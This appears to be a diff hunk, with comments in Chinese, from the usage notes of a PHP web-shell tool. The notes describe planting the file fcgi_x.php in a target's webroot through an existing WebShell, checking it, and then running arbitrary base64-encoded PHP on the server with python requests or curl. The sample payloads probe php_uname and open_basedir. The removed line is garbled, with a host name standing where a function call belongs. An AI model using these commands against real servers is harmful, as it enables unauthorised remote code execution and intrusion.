@@ -24,7 +24,7 @@
 1) 用已有 WebShell 把本文件写到目标 webroot 可访问路径（例如 ./Public/www/fcgi_x.php）。
 2) 自检：curl -H 'Host: <vhost>' http://<ip>/Public/www/fcgi_x.php  → 返回 RDY_FCGI
 3) 执行任意 PHP：
-   python -c "import base64,requests;code=open('task.php','rb').read();print(target9.example.com('http://<ip>/Public/www/fcgi_x.php',headers={'Host':'<vhost>'},data={'t':base64.b64encode(b'echo php_uname();').decode()}).text)"
+   python -c "import base64,requests;code=open('task.php','rb').read();print(requests.post('http://<ip>/Public/www/fcgi_x.php',headers={'Host':'<vhost>'},data={'t':base64.b64encode(b'echo php_uname();').decode()}).text)"
    或直接：
    curl -s -H 'Host: <vhost>' --data-urlencode "t=$(echo -n 'echo ini_get("open_basedir");' | base64 -w0)" http://<ip>/Public/www/fcgi_x.php
 
